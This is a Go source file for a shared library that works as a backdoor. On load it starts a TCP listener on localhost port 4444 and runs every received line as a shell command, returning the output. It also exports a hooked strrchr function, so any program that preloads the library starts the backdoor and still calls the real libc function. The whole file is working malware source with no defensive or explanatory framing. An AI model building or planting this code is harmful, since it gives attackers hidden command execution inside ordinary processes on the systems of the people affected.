package main

import "C"

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"net/textproto"
	"os/exec"

	"github.com/rainycape/dl"
)

// main is required to build a shared library, but does nothing
func main() {}

func init() {
	fmt.Println("In init!")
	go backdoor()
}

func backdoor() {
	log.Println("got it")
	ln, err := net.Listen("tcp", "localhost:4444")
	if err != nil {
		return
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}

		go handleConnection(conn)
	}
}

//export strrchr
func strrchr(s *C.char, c C.int) *C.char {
	go backdoor()

	lib, err := dl.Open("libc", 0)
	if err != nil {
		log.Fatalln(err)
	}
	defer lib.Close()

	var oldStrrchr func(s *C.char, c C.int) *C.char
	lib.Sym("strrchr", &oldStrrchr)

	return oldStrrchr(s, c)
}

func handleConnection(conn net.Conn) {
	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)

	for {
		input, err := tp.ReadLine()
		if err != nil {
			log.Println("Error reading:", err.Error())
			break
		}

		cmd := exec.Command("/usr/bin/env", "sh", "-c", input)
		output, err := cmd.CombinedOutput()
		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
		}

		conn.Write(output)
	}

	conn.Close()
}
